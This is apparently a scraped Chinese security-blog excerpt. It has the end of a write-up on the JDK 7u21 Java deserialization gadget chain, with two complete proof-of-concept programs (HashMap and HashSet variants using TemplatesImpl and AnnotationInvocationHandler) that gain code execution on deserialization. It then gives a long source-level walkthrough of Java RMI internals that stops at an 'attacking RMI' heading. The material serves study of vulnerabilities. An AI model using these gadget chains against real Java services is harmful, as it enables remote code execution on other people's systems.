HashMap(); HashMap hash = new HashMap(); hash.put(\u0026#34;fupanc1\u0026#34;,111); hash.put(\u0026#34;fupanc2\u0026#34;,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 这样在反序列化时就是先放入的第一个，再放入的第二个。\n——————\n基于现在的情况，那么现在序列化前的流程肯定也要变，简单跟一下： 还是直接断于hash中第二次放入键值对的代码，如下：\n可以知道这里的hash值时肯定相同的，具体流程和之前分析的不一样，但是此时的调用equals()方法就有区别了，这里的TemplatesImpl类没有定义equals()方法，这里会直接调用到Object.java类的equals()方法：\n从变量的值来看，这里是会返回false的，然后直接就会成功放入第二个键值对。\n所以最终的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package java_foundation; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(proxy,111); hash.put(ctf,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } HashSet HashSet本来就和HashMap差不多，并且反序列化时也是先反序列化的第二个键值对。readObject内容为：\n可以看到其实就是调用的HashMap的put()方法，这个也是前面分析过了的，最终POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package java_foundation; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashSet hash = new HashSet(); hash.add(proxy); hash.add(ctf); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功在反序列化时弹计算机。\n其实在可以利用equals()方法的地方，只要JDK版本符合 \u0026lt;= 7u21 ，都要想到这个原生链，比如ROME链的第三条就有用到equals()方法，大同小异。\n","date":"2024-10-11T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/jdk-7u21/","title":"JDK 7u21"},{"content":"RMI RMI全称是Remote Method Invocation，远程方法调用。这种思想其实是和C语言的RPC类似的。在这里的RMI是Java独有的一种机制，也就是可以让某个java虚拟机上的对象调用另一个java虚拟机中对象上的方法。\n具体思想就是让我们获取远程主机上对象的引用，我们调用这个引用对象，但实际方法的执行在远程服务端上。\nRMI架构 从RMI设计角度来讲，基本分为三层架构来实现RMI，分别为RMI服务端，RMI客户端和RMI注册中心。（但是其实服务端和注册中心是可以放在一起的）\nClient-客户端：客户端调用服务端的方法 Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端方法执行的结果 Registry-注册中心 Stub 和 Skeleton：\nRMI引入了两个概念，分别是Stubs（客户端存根）以及Skeletons（服务端骨架），当客户端（Client）试图调用一个远端的Object，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用服务端（Server）的目标类之前，也会经过一个对应的远端代理类，就是Skeleton，它从Stub中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeleton的调用对于 RMI服务的使用者来讲是隐藏的。\n时序图如下：\n还是比较清楚的。\n基本流程学习 测试环境：\nJDK 8u411 调用对象如何定义 使用RMI，首先我们需要定义一个能够远程调用的接口，这个接口必须扩展java.rmi.Remote接口，用于表示可以从非本地虚拟机调用其方法，所以远程调用的对象必须实现这个接口。其次这个接口的所有方法都必须声明抛出java.rmi.RemoteException异常，如下实例：\n1 2 3 4 5 6 7 8 9 package Rmi.Server; import java.rmi.Remote; import java.rmi.RemoteException; public interface RemoteInterface extends Remote { public String sayHello() throws RemoteException; public String sayName(Object name) throws RemoteException; } 随后就可以来创建这个远程接口的实现类，这个类通常会扩展java.rmi.server.UnicastRemoteObject类，扩展此类后，RMI会自动将这个类 输出（export） 给远程想要调用它的 Client 端（注册中心？）。这里必须为这个实现类提供一个构造函数并且抛出 RemoteException。示例代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package Rmi.Server; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RemoteTest extends UnicastRemoteObject implements RemoteInterface { protected RemoteTest() throws RemoteException{ } public String sayHello() throws RemoteException{ return \u0026#34;Hello welcome to use\u0026#34;; } public String sayName(Object name) throws RemoteException{ return \u0026#34;hello\u0026#34;+name; } } 如果不让远程对象成为 UnicastRemoteObject 的子类，后面就需要自己手动使用UnicastRemoteObject的静态方法exportObject来手动 export 对象。\n如何调用 前面就已经创建好了可以被远程调用的对象。如何调用呢。Java RMI 涉及了一个 Registry 的思想，也就是我们可以使用注册表来查找一个远端对象的引用。\n如何理解，可以将Registry理解为 RMI电话本，当我们想要在某个人那里获取信息时（Remote Method Invocation），我们在电话本上（Registry）通过这个人的名称（Name）来找到这个人的电话号码（Reference），并通过这个号码找到这个人（Remote Object）。\n这种电话本的思想，由java.rmi.registry.Registry和java.rmi.Naming来实现。现在分别来看一下这两个类的利用。\njava.rmi.Naming：这是一个final类，提供了在远程对象注册表（Registry）中存储和获取远程对象引用的方法，这个类提供的每个方法都有一个 URL 格式的参数，格式如下：//host:port/name： host 表示注册表所在的主机 port表示注册表接收调用的端口号，默认为 1099 name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字。 Naming 提供了查询（lookup）、绑定（bind）、重新绑定（rebind）、解除绑定（unbind）、list（列表）用来对注册表进行操作。所以Naming类就是一个用来对注册表进行操作的类。而这些方法的具体实现，是调用LocateRegistry.getRegistry方法获取了Registry接口的实现类，并调用相关方法进行实现的。\njava.rmi.registry.Registry：这个接口在RMI下有两个实现类，分别是RegistryImpl和RegistryImpl_Stub。后面再看。 我们通常使用LocateRegistry#createRegistry()方法来创建注册中心，然后将待调用的类进行绑定：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package Rmi.Server; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIServer{ public static void main(String[] args){ try { //创建注册中心 LocateRegistry.createRegistry(1099); System.out.println(\u0026#34;Server start\u0026#34;); //绑定调用类 RemoteInterface remoteTest = new RemoteTest(); Naming.bind(\u0026#34;rmi://localhost:1099/Hello\u0026#34;,remoteTest); }catch(Exception e){ e.printStackTrace(); } } } 客户端进行调用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package Rmi.Client; //需要两端使用的RemoteInterface接口文件是同一个，或者打成jar包再使用。 import Rmi.Server.RemoteInterface; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.Arrays; import java.rmi.Naming; public class RMIClient{ public static void main(String[] args) throws Exception { //获取注册表对象 Registry r = LocateRegistry.getRegistry(\u0026#34;localhost\u0026#34;,1099); System.out.println(Arrays.toString(r.list())); //寻找对应RMI实例 RemoteInterface o = (RemoteInterface) Naming.lookup(\u0026#34;Hello\u0026#34;); //调用远程对象的方法 System.out.println(o.sayHello()); System.out.println(o.sayName(new ClientObject())); } } 先运行RMIServer： 成功运行并绑定。再运行客户端RMIClient去调用对象的方法： 成功调用。\n需要注意的是这里 RemoteInterface 接口在 Client/Server/Registry 均应该存在，一般 Registry 与 Server 在同一端上。\n——————\n其他特性说明 前面就是一个简单的远程调用通信。还需要知道RMI还可以使用动态类加载和安全管理器来安全传输Java类。\n动态类加载 java.rmi.server.codebase：该属性表示一个或多个URL位置，可以从中下载本地（CLASSPATH）找不到的类，相当于一个代码库。\n如果客户端在调用时，传递了一个可序列化对象（比如前面例子中sayName()方法我传进去一个类实例），这个对象在服务端不存在，则在服务端会抛出ClassNotFound 的异常，但是 RMI 支持动态类加载，如果设置了java.rmi.server.codebase，则会尝试从其中的地址获取.class并加载及反序列化。\n客户端同样，如果得到一个客户端没有的class文件，就会从服务端提供的java.rmi.server.codebaseURL去加载类。\n可使用 System.setProperty(\u0026quot;java.rmi.server.codebase\u0026quot;, \u0026quot;http://127.0.0.1:9999/\u0026quot;); 进行设置，或使用启动参数 -Djava.rmi.server.codebase=\u0026quot;http://127.0.0.1:9999/\u0026quot; 进行指定。\n安全设置 我们通过网络加载外部类并执行方法，必须要有一个安全管理器来进行管理，如果没有设置安全管理，则RMI不会动态加载任何类，通常使用如下代码：\n1 2 3 if (System.getSecurityManager() == null) { System.setSecurityManager(new RMISecurityManager()); } 管理器和管理策略相辅相成，所以还需要提供一个策略文件，里面配值允许哪些主机进行哪些操作，如下便是全部权限：\n1 2 3 4 //rmi.policy grant { permission java.security.AllPermission; }; 同样可以使用 -Djava.security.policy=rmi.policy 或 System.setProperty(\u0026quot;java.security.policy\u0026quot;, RemoteServer.class.getClassLoader().getResource(\u0026quot;rmi.policy\u0026quot;).toString()); 来进行设置。\n源码分析 前面学习了大概的流程，现在来跟一下源码看具体实现。\n服务注册 远程对象创建 在前面我们创建了一个远程对象 RemoteTest，继承了 UnicastRemoteObject类，这个类使用 JRMP 协议 export 远程对象，并获取与远程对象进行通信的 Stub。并在服务端创建过程中对这个类进行了初始化，对应下代码：\n1 RemoteInterface remoteTest = new RemoteTest(); 打断点跟一下这里的流程，在RemoteTest初始化时，由于远程对象继承了UnicastRemoteObject类，所以会调用这个类的构造方法：\n这里的this就是我们要注册的远程对象（RemoteTest对象），然后就会调用UnicastRemoteObject类的exportObject()方法： 然后实例化了UnicastServerRef类并且又调用UnicastRemoteObject类的 exportObject方法。\n先跟进这个UnicastServerRef类的实例： 这里又实例化了一个LiveRef类，这里的var1即前面的port(即0)，再跟进LiveRef类的初始化：\n又实例化了一个objID类，继续跟进：\n也就是对objID类的填充。值分别为：\n回到LiveRef类的构造方法，然后就会调用LiveRef类的构造方法： 然后就是对LiveRef类的填充：\n在LiveRef类初始化完毕后，就会进行父类的初始化：\n再跟进一下父类的实例： 也就是说现在将UnicastRef类的ref变量赋值为了一个LiveRef类的实例。最后回到UnicastServerRef类的构造方法：\n也就是对这个类的填充，对这些类进行了实例化。\n再跟进exportObject()方法 前面跟了UnicastServerRef类的初始化，再来看这里的exportObject()方法：\n这里毫无疑问会进入if语句，这里的if语句简单来说就是会给这个RemoteTest类的“ref”设置为一个UnicastServerRef类实例？（说是使得远程对象能够在网络上被正常地定位和访问）。\n然后就会调用sref(UnicastServerRef类实例)的exportObject()方法：\n在这里看到一个createProxy()方法，和动态代理那里感觉很像，看一下这个方法的参数传递与源代码。\n同样的先看一下这里的getClientRef()方法： 返回了一个UnicastRef类实例，前面有用到这个类（UnicastServerRef类初始化时调用的父类），继续跟进：\n还是和前面的差不多，看了一下变量类型这些，还是将LiveRef类实例赋值给了这个变量（并且好像也是差不多的），其实在前面调用getClientRef()方法时就调用了this.ref，但是由于本类UnicastServerRef没有这个变量，其实最终传进去的就是我们前面初始化时赋值的父类UnicastRef的ref变量。所以这里的目的应该就是获取填充了的UnicastRef类实例。\n再回到原先的createProxy()方法： 然后就会调用到sun.rmi.server.Util类下的createProxy()方法：\n简单跟了一下这个源码中的方法：\ngetRemoteClass()：也就是判断var0的接口是否继承Remote.class，是的话就返回这个var0，毫无疑问我们的RemoteTest类接口是继承了的，所以这里的var3可以看作是等价于var0的。 然后继续看，到了if条件，var2即传参进来的forceStubUse变量，而这个变量在我们最开始对UnicastServerRef类进行初始化的时候就已经赋值为false了：\n然后ignoreStubClasses默认为false，在java中 \u0026amp;\u0026amp; 运算符的优先级比 || 的高，现在已知var2为false，!ignoreStubClasses为true，现在重点看这个stubClassExists()方法：\n简单来说就是判断 withoutStubs 变量是否存在var0这个key，不存在的话就会调用forName()方法去找xxx_Stub 这个类，找到了就返回true。很正常会进入到这个if语句，但同样的不存在RemoteTest_Stub这个类会进入到catch语句：\n最后stubClassExists()方法返回了false。\n——————\n最后并不会进入if条件：\n看源码，简单跟方法，大概如下：\ngetRemoteInterfaces()：简单来说就是获取实现了Remote.class接口及Remote.class接口。在这里获取到的也就是Remote.class和RemoteInterface.class. 后面的也就和动态代理大差不差了。代理类为RemoteObjectInvocationHandler类，委托类是UnicastRef类实例。\n所以最后就是返回了一个Remote类型的RemoteObjectInvocationHandler代理对象。\n所以说只要对这个代理对象调用方法就会到RemoteObjectInvoactionHandler类的invoke()方法。\n回到UnicastServerRef类的export()方法，前面返回了一个Remote类型的代理对象，后面又实例化了一个Target类：\n简单看一下这里的Target类初始化时传进去的参数：\nvar1：即RemoteTest类实例\nthis：也就是UnicastServerRef类实例。\nvar5：即前面的代理对象\nthis.ref.getObjID()：\n就是返回我们前面实例化LiveRef类时的id。\nvar3：即最开始传入export()方法的false 简单看看赋值情况：\n这里的Target对象也就是封装了我们的远程对象和生成的动态代理类。\n然后调用了LiveRef类的exportObject()方法，传进去了刚实例化完的Target对象： 即：\n这里的ep也就是前面分析的LiveRef实例是有过赋值的变量。\n所以现在又会调用TCPEndpoint类的exportObject()方法：\n然后就会调用到TCPTransport类的exportObject()方法：\n这里的listen()方法就是为本地的stub(代理类)开启一个随机端口，然后本地监听这个端口。\n然后调用了父类的export()方法，传进去了Target类实例，跟进一下：\n这里主要就是将Target对象存放进ObjectTable类中，ObjectTable用来管理所有发布的服务实例Target，简单看一下这里的putTarget()方法：\n这里就是放进了键值对，在这个类中的这两个objTable和implTable变量都是HashMap类实例。这里可以看到是向里面put进值了的，现在来看一下值的情况：\nvalue有三个，分别是：\n我们前面分析出来的代理类： 后面注册中心创建分析出来的RegistryImpl_Stub类： DGCImpl_Stub类，好像是与垃圾回收相关的，默认创建： 这里最开始学的时候是踩了一下坑的，我是直接用的流程学习的代码来分析的，注册中心创建的流程也是会调用到UnicastServerRef类的exportObject()方法的，所以其实也会进行一次这里的put操作，个人调试时死活不能进入super.exportObject()方法，直接打断点会断在注册中心调用的super.exportObject()方法中，那里就只会有两个，并且看不出来有代理对象，所以其实这里的学习调用可以直接用如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package Rmi.Server; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIServer{ public static void main(String[] args){ try { //绑定调用类 RemoteInterface remoteTest = new RemoteTest(); Naming.bind(\u0026#34;rmi://localhost:1099/Hello\u0026#34;,remoteTest); }catch(Exception e){ e.printStackTrace(); } } } 不要注册中心来调试。\n（题外话结束）\n————————\n最后回到UnicastServerRef类的exportObject()方法，最终是返回了代理对象的：\n大概远程创建对象的过程就是这样，注意这里是将远程对象和代理对象都放进了一个Target类实例，并且这里代理对象的委托类是UnicastRef类。\n——————————\n注册中心创建 对应如下代码：\n1 LocateRegistry.createRegistry(1099); 同样的加断点跟一下过程：\n实例化了一个RegistryImpl类实例，传进去了port为1099，跟进一下这里的构造方法：\n稍微注意一下这里的bindings变量被赋值为了Hashtable类。\n然后会进入else语句：\n注意看这里的LiveRef类实例语句，传进去了一个id和我们传进去的port（1099），看一下这里的id变量的定义：\n这里和前面远程对象创建的分析部分还是有点像的。所以这里是传入了ObjID类实例和port（1099），对LiveRef类的变量进行了赋值：\n然后就会调用setup()方法： 先跟UnicastServerRef类的初始化： 所以这里还是将UnicastServerRef类的父类UnicastRef的ref变量赋值为了一个LiveRef类实例：\n再跟调用的setup()方法，传进去了刚初始化完的UnicastServerRef类实例： 跟了一下，这里应该是将RegistryImpl类的父类RemoteServer的父类RemoteObject的ref变量赋值为了传进来的UnicastServerRef类实例（不确定，先看后面）。\n然后又调用了UnicastServerRef类的exportObject()方法，只不过这里传入的是RegistryImpl类实例：\n又到了前面分析过的exportObject()方法。\n跟进这里的Util.createProxy()方法：\n关键还是这个stubClassExists()方法： 这里找到了RegistryImpl_Stub这个Class对象？所以可以返回true。\n所以会进入if语句，而不是上一次分析的进入else语句：\n这里又调用了createStub()方法，分别传入了RegistryImpl类的class对象和参数传递的UnicastRef对象：\n这里的代码逻辑还是挺好看的，也就是对RegistryImpl_Stub的class对象调用了newInstance()方法并传递了UnicastRef作为参数，所以这里的createStub()方法（即createProxy()方法）就是实例化了一个RegistryImpl_Stub类并返回它。 回到UnicastServerRef类的exportObject()方法：\n不同点又来了，这里就会进入到这个if条件，前面返回的RegistryImpl_Stub类会赋值给var5，而RegistryImpl_Stub类的父类就是RemoteStub，自然会符合这个if条件语句的判定，跟进setSkeleton()方法，这里传入了RegistryImpl类实例：\n变量中不存在key为RegistryImpl的Class对象，会进入这里的if条件：\n然后调用Util类的createSkeleton()方法，还是将RegistryImpl类实例作为参数传递：\n这里的getRemoteClass()方法前面分析过，所以这里可以直接将var1看作RegistryImpl类的Class对象。\n所以这里的createSkeleton()方法就是实例化了一个RegistryImpl_Skel类。\n即现在UnicastServerRef类的skel变量是RegistryImpl_Skel类实例：\nsetSkeleton()方法结束。\n所以在注册中心板块这里，实现了RegistryImpl_Stub类的RegistryImpl_Skel类实例。\n——————\n回到UnicastServerRef类的exportObject()方法，后续还是封装进了Target类：\n还是分别说一下这里的参数：\nvar1：RegistryImpl类实例 this：UnicastServerRef类实例（类包含skel这个变量） var5：RegistryImpl_Stub类实例 this.ref.getObjID()：返回前面的LiveRef中的id，前面也是提到过的： var3：前面传参时传进来的值，为true 然后调用LiveRef的export()方法，流程和前面差不多，直接到Transport类：\n这里又将一个Target对象放进了ObjectTable中。所以现在是有变量中有两个键值对：\n一个RegistryImpl_Stub类实例： 并且我们还能看到前面分析的RegistryImpl_Skel类实例：\n一个默认创建的DGCImpl_Stub类实例： 正好与前面的远程对象创建那里相呼应，很好说明这里为什么是两个，前面为什么是三个。\n注册中心与远程服务对象注册的大部分流程相同，差异在：\n远程服务对象使用动态代理，invoke 方法最终调用 UnicastRef 的 invoke 方法，注册中心使用 RegistryImpl_Stub，同时还创建了 RegistryImpl_Skel 远程对象默认随机端口，注册中心默认是 1099（当然也可以指定） 服务注册 对应代码：\n1 2 Naming.bind(\u0026#34;rmi://localhost:1099/Hello\u0026#34;,remoteTest); //这里的remoteTest就是前面的RemoteTest类实例 跟一下过程：\n这里的parseURL()方法就是解析传进来的url，效果如图：\n跟进一下这里的getRegistry()方法源码：\n和流程学习那里的客户端获取注册表对象的代码基本相同，稍微注意一下。\n然后调用到了RegistryImpl_Stub类的bind()方法（正好对应到注册中心创建）：\nthis.ref 与前面注册中心分析时的RegistryImpl_Stub类的newInstance()传入的参数相对应。\n所以这里调用UnicastRef类的newCall()方法是合情合理的，这里的newCall方法简单来说就是返回一个连接对象\n所以这里就是建立连接（服务端和注册端建立）然后向流里writeObject数据。\n然后会调用到UnicastRef类的invoke()方法来进行网络传输：\n里面会调用到executeCall()方法，而executeCall()方法会调用readObject()方法反序列化来反序连接对象：\n个人调试时没到这一步（稍微注意一下）\n这里有网络数据的传输，必然会到注册中心进行代码调用，后续的在注册中心的调用可以参考后面的服务调用那里的注册中心的过程。\n在那里反序列化传过去的值后成功绑定。\n服务发现 前面已经基本分析完了服务端的代码，再来看一看客户端。\n服务发现，就是获取注册中心并对其进行操作的过程，这里包含Server端和Client端两种。\n对应代码：\n1 RemoteInterface o = (RemoteInterface) Naming.lookup(\u0026#34;Hello\u0026#34;); 先运行服务端，再打断点调试客户端。\n进入lookup()方法：\n这里的parseURL()方法同样还是一个解析的操作，最后效果如下：\ngetRegistry()方法也是同样的，起一个获取注册表的操作：\n所以还是获取到了RegistryImpl_Stub类对象，然后调用了RegistryImpl_Stub类的lookup()方法： 在这里获取到连接后，会对这个连接序列化：\n然后通过UnicastRef类的invoke()方法来传输这个var2，还是起一个网络传输的作用。\n然后通过反序列化，来获取注册远程对象时创建的代理类：\n最后返回了这个var20：\n从图中可以看出就是我们之前构造的代理对象。\n也就是说，这里在调用 其lookup 方法时，会向 Registry 端传递序列化的name，然后将 Registry 端返回的结果反序列化。\n所以在客户端的代码中，我们获取到的o就是这个代理对象：\n服务调用 在前面我们已经获取到了代理对象。现在再来分析一下过程是怎么样的。\n客户端 既然已经获取到了代理对象，并且对代理对象调用了方法，对应如下代码：\n1 System.out.println(o.sayHello()); 所以现在会调用RemoteObjectInvocationHandler类的invoke()方法：\n此时的参数情况：\n还是挺符合预期的。\n断点也刚好断在这里，也算是刚好说明sayHello()方法不是一个Object方法：\n然后这里会调用invokeRemoteMethod()方法作为返回值，跟进这个invokeRemoteMethod()方法： 前面的if语句都没有进入，这里的ref就是前面创建动态代理时的UnicastRef类，所以现在会调用UnicastRef类的invoke()方法，简单说一下这里传递的参数：\nproxy：也就是代理对象 method：也就是sayHello。 args：null getMethodHash(method)：获取方法的hash？序列化传过去？结果如下： 进入UnicastRef类的invoke()方法：\n第一框内代码就是获取相关连接的方法等。\n第二个框内的代码就是获取连接对象，对应var7，这个连接对象也是老朋友了。\n继续看invoke()方法中的其他重要代码：\n这里的marshalValue()方法就是进行序列化，对传入的参数进行序列化，可以简单理解为想要调用的方法名等的序列化。\n后面又调用了executeCall()方法，这个代码逻辑和前面分析那次的差不多，也是一个网络传输的方法？\n然后又调用了unmarshalValue()方法用来反序列化，和前面marshalValue()方法附近的代码对比，那里的序列化的操作，在这里则是反序列化的操作，跟进这里的unmarshalValue()方法，有一个反序列化操作：\n所以这里的客户端有一个反序列化操作，这里的反序列化操作应该就是反序列化获取到服务端调用方法得到的返回值。\n最后方法会返回var13，也就是var47：\n看了一下参数，确实这里最后返回的就是sayHello()方法的return的值。\n注册中心 这里就需要调试注册中心的代码，每次客户端或者服务端与注册中心交互的时候都会调用。\n在注册端，由sun.rmi.transport.tcp.TCPTransport#handleMessages()方法来处理请求，当服务传入rmi时，就是进入第一个switch/case语句：\n这里会调用serviceCall()方法，并且传进去了一个var6变量，这里的var6就是之前说过的一个连接对象。\n跟进这个serviceCall()方法：\n但是我是class文件，源码不是很全，简单过一遍。\n这里对ObjectTable类调用了getTarget()方法： 即方框中的代码大体逻辑就是从ObjectTable中获取封装的Target对象。\n箭头指向的getImpl()方法就是获取其中的封装的RegistryImpl对象。\n然后获取其中封装的UnicastServerRef对象，UnicastServerRef是Dispatcher接口的一个实现类：\n然后调用了UnicastServerRef类的dispatch()方法： 这里的var37就是前面调用getImpl()方法得到的RegistyImpl类实例，var1就是传进来的连接对象。\n继续跟进，如下：\nskel就是前面分析过的RegistryImpl_Skel类，所以又会调用oldDispatch()方法：\n这里可以看到又会调用RegistryImpl_Skel类的dispatch()方法（class文件简单分析一下）：\n里面涉及到了switch/case，\n这里的0表示调用的是bind()方法：\n（对应服务端调用的 bind 方法的代码）\n重点的两个变量：\nvar7：即传进来的连接对象 var6：即传进来的RegistyImpl类实例 代码逻辑就比较好看懂了。\n先对这个连接对象字节流反序列化以获取远程对象和RMI服务名称。\n然后通过调用bind()方法来绑定RMI服务，然后跟进一下这里的bind()方法： 所以现在就进行了一次绑定操作，对应客户端代码调用的bind()方法绑定。\n——————\n这里case的2表示处理lookup方法的请求：\n以此类推，1是处理list()方法，3是rebind()方法等。\n服务端 再来看一下服务端是如何调用的，此时我们就需要调试服务端，启动客户端。\n打断点于UnicastServerRef的dispatch()方法如下位置： 上图就已经可以看出这里的skel为null，不会调用oldDispatch()方法，也是判断是Registry端还是Server端的过程。继续往后面看：\n看这里涉及到的几个参数： 先调用unmarshalParameters()方法反序列化了客户端传来的参数，然后调用了invoke实现了sayHello()方法的执行。然后再调用marshalValue()方法将数据（即调用方法后返回的值）序列化。\n成功闭环。\n简单说明一下这里的var42变量的调用： 调试跟进这个方法，进入到如下：\n注意看此时l的变量，正好和前面客户端传入的method的hash值是相同的。\n这一个点基本可以说明在UnicastServerRef的dispatch方法中就是通过this.hashToMethod_Map里的Method的hash来查找的。\n总结 RMI 底层通讯采用了Stub（运行在客户端）和Skeleton（运行在服务端）机制，RMI 调用远程方法的过程大致如下：\nRMI 客户端在调用远程方法时会先创建 Stub ( sun.rmi.registry.RegistryImpl_Stub )。 Stub 会将 Remote 对象传递给远程引用层 ( java.rmi.server.RemoteRef ) 并创建 java.rmi.server.RemoteCall( 远程调用 )对象。 RemoteCall 序列化 RMI 服务名称、Remote 对象。 RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。 RMI服务端的远程引用层( sun.rmi.server.UnicastServerRef )收到请求会请求传递给 Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )。 Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。 Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。 RMI 客户端反序列化服务端结果，获取远程对象的引用。 RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。 RMI 客户端反序列化 RMI 远程方法调用结果。 DGC Distributed Garbage Collection，分布式垃圾回收。\n当RMI服务器返回一个对象到其客户端时，其跟踪远程对象在客户机中的使用。当再没有更多的对客户机上远程对象的引用时，或者如果引用的“租借”过期并且没有更新，服务器将垃圾回收远程对象。启动一个RMI服务，就会伴随着DGC服务端的启动。\n在前面源码分析时，就发现到objTable中有默认的DGCImpl对象： 回到ObjectTable的putTarget()方法，关键代码如下：\n这里的dgclog是DGCImpl类的静态变量：\n这里调用了这个静态变量，会对DGCImpl类进行类初始化，而DGCImpl类存在static静态代码块： 基本就能解释我为什么ObjectTable中会默认有DGCImpl对象了。\n同时还创建了DGCImpl_Stub代理类和DGCImpl_Skel对象。\n很熟悉，并且其实这里的命名规则和处理逻辑类似Registry对象。\nJava提供了java.rmi.dgc.DGC接口，这个接口继承了Remote接口，定义了dirty和clean方法。\n在RegistryImpl_Stub#lookup()方法中，前面我们都是分析到反序列化就没走了，但是这里在后续调用的done()方法中其实还有这个DGCImpl类的利用： 持续跟进，可以看到如下代码： 所以这里会创建DGCImpl_Stub类实例等。\nDGC通信的处理类同样的是 DCGImpl_Skel 的dispatch()方法，还是对应的switch/case语句，如下： case1： 可以看到这里调用了反序列化，然后调用调用dirty()方法，然后再序列化输出。\ncase0对应的clean()方法。\n攻击 RMI 攻击Server端 恶意方法 